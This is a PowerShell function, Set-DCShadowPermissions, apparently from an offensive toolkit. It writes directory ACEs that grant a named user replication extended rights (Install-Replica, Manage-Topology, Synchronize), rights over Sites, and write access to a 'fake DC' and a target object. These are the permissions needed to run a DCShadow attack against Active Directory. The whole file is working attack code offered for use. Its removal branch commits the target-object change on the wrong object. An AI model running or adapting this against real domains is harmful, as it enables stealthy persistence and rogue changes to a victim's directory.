function Set-DCShadowPermissions
{
    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $FakeDC,

        [Parameter(ParameterSetName="Object",Position = 1, Mandatory = $False)]
        [String]
        $Object,

        [Parameter(ParameterSetName="SamAccountName",Position = 2, Mandatory = $False)]
        [String]
        $SamAccountName,
        
        [Parameter(ParameterSetName="ADSPAth",Position = 3, Mandatory = $False)]
        [String]
        $ADSPath,

        [Parameter(Position = 4, Mandatory = $False)]
        [String]
        $Username,

        [Parameter(Mandatory = $False)]
        [Switch]
        $Remove
    )

    Write-Warning "This script must be run with Domain Administrator privileges or equivalent permissions. This is not a check but a reminder."

    $sid = New-Object System.Security.Principal.NTAccount($username)

    function Get-Searcher
    {
        Param(

            [Parameter()]
            [String]
            $Name,

            [Parameter()]
            [String]
            $sn
        )

        $objDomain = New-Object System.DirectoryServices.DirectoryEntry
        $DomainDN = $objDomain.DistinguishedName
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher
        $objSearcher.SearchRoot = $objDomain

        if ($sn)
        {
            $strFilter = "(&(samAccountName= $sn))"
        }
        elseif ($Name)
        {
            $strFilter = "(&(Name= $Name))"
        }
        $objSearcher.Filter = $strFilter
        $SearchResult = $objSearcher.FindAll()
        $Object = [ADSI]($SearchResult.Path)
        $Object
    }
    
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $DomainDN = $objDomain.DistinguishedName  
    $objSites = New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Sites,CN=Configuration,$DomainDN")
    $IdentitySID = $SID.Translate([System.Security.Principal.SecurityIdentifier]).value
    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$IdentitySID)
    $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'All'
    $ControlType = [System.Security.AccessControl.AccessControlType] 'Allow'
    $nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
    $ACESites = New-Object DirectoryServices.ActiveDirectoryAccessRule($sid,'CreateChild,DeleteChild','Allow','All',$nullGUID)
    $objSites.PsBase.ObjectSecurity.AddAccessRule($ACESites)
    
    $objectGuidInstallReplica = New-Object Guid 9923a32a-3607-11d2-b9be-0000f87a36b2
    $ACEInstallReplica = New-Object DirectoryServices.ActiveDirectoryAccessRule($sid,'ExtendedRight','Allow',$objectGuidInstallReplica)
    $objDomain.PsBase.ObjectSecurity.AddAccessRule($ACEInstallReplica)

    $objectGuidManageTopology = New-Object Guid 1131f6ac-9c07-11d1-f79f-00c04fc2dcd2
    $ACEManageTopology = New-Object DirectoryServices.ActiveDirectoryAccessRule($sid,'ExtendedRight','Allow',$objectGuidManageTopology)
    $objDomain.PsBase.ObjectSecurity.AddAccessRule($ACEManageTopology)
   
    $objectGuidSynchronize = New-Object Guid 1131f6ab-9c07-11d1-f79f-00c04fc2dcd2
    $ACESynchronize = New-Object DirectoryServices.ActiveDirectoryAccessRule($sid,'ExtendedRight','Allow',$objectGuidSynchronize)
    $objDomain.PsBase.ObjectSecurity.AddAccessRule($ACESynchronize)

    $objFakeDC = Get-Searcher -Name $FakeDC
    $ACEFakeDC = New-Object DirectoryServices.ActiveDirectoryAccessRule($sid,'WriteProperty','Allow')
    $ObjFakeDC.PsBase.ObjectSecurity.AddAccessRule($ACEFakeDC)
    
    if ($Object)
    {
        $TargetObject = Get-Searcher -Name $Object
    }
    elseif ($SAMAccountName)
    {
        $TargetObject = Get-Searcher -sn $SAMAccountName
    }
    elseif ($ADSPath)
    {
        $TargetObject = New-Object System.DirectoryServices.DirectoryEntry($ADSPath)
    }
    $ACETarget = New-Object DirectoryServices.ActiveDirectoryAccessRule($sid,'WriteProperty','Allow')
    $TargetObject.PsBase.ObjectSecurity.AddAccessRule($ACETarget)

    if (!$Remove)
    {
        Write-Verbose "Modifying permissions for user $username for all Sites in $($objSites.DistinguishedName)"
        $objSites.PsBase.commitchanges()

        Write-Verbose "Providing $username minimal replication rights in $DomainDN"
        $objDomain.PsBase.commitchanges()

        Write-Verbose "Providing $username Write permissions for the computer object $($objFakeDC.DistinguishedName) to be registered as Fake DC"
        $objFakeDC.PsBase.commitchanges()

        Write-Verbose "Providing $username Write permissions for the target object $($TargetObject.DistinguishedName)"
        $TargetObject.PsBase.commitchanges()
    }
    elseif ($Remove)
    {
        Write-Verbose "Removing the ACEs added by this script."
        
        $objSites.PsBase.ObjectSecurity.RemoveAccessRule($ACESites)
        $objSites.PsBase.commitchanges()
        
        $objDomain.PsBase.ObjectSecurity.RemoveAccessRule($ACEInstallReplica)
        $objDomain.PsBase.ObjectSecurity.RemoveAccessRule($ACEManageTopology)
        $objDomain.PsBase.ObjectSecurity.RemoveAccessRule($ACESynchronize)
        $objDomain.PsBase.commitchanges()

        $ObjFakeDC.PsBase.ObjectSecurity.RemoveAccessRule($ACEFakeDC)
        $objFakeDC.PsBase.commitchanges()

        $TargetObject.PsBase.ObjectSecurity.RemoveAccessRule($ACETarget)
        $objFakeDC.PsBase.commitchanges()
    }
}